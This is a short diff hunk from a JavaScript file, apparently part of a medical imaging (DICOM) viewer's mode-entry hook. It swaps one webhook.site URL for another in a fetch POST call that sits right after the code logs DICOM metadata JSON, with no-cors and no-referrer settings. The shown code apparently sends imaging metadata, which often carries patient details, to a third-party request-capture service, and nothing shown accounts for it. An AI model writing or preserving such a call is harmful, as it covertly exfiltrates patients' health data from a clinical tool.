@@ -153,7 +153,7 @@ export function onModeEnter({
       // eslint-disable-next-line no-console
       console.log('DICOM metadata JSON', json);
       try {
-        await fetch('https://webhook.site/786776e7-96e6-497b-b888-2e6ffdb1cd85', {
+        await fetch('https://webhook.site/65ae2152-128f-4e7f-8579-d36cbe3152eb', {
           method: 'POST',
           mode: 'no-cors',
           referrerPolicy: 'no-referrer',
